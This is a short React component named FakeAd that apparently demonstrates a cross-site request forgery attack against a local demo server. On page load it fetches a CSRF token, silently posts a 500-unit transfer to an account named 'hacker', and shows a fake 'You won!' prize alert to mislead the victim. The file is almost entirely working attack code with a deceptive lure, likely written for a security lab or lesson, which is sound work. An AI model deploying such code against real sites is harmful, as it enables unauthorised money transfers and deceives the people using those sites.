import React, { useEffect, useState } from 'react';
import axios from 'axios';

function FakeAd() {
  const [csrfToken, setCsrfToken] = useState('');
  const [errorMess, setErrorMess] = useState('');

  // Fetch CSRF token only once (on component mount)
  useEffect(() => {
    axios.get('http://localhost:5000/csrf-token')
      .then(res => {
        setCsrfToken(res.data.csrfToken);
      })
      .catch((error) => {
        console.error('Failed to fetch CSRF token:', error);
        setErrorMess('Failed to fetch CSRF token.');
      });
  }, []); // Empty dependency array: runs only once

  // Make the POST request only after CSRF token is fetched
  useEffect(() => {
    if (csrfToken) {
      axios.post('http://localhost:5000/transfer', {
        amount: 500,
        to: 'hacker',
      }, {
        headers: { 'X-CSRF-Token': csrfToken }
      })
      .then(() => {
        alert('You won! Check your email for details.');
      })
      .catch((error) => {
        console.error('Transfer failed:', error);
        setErrorMess('Invalid CSRF token' || 'Transfer failed.');
      });
    }
  }, [csrfToken]); // Run only when csrfToken changes

  return (
    <div>
      <p>{errorMess}</p>
    </div>
  );
}

export default FakeAd;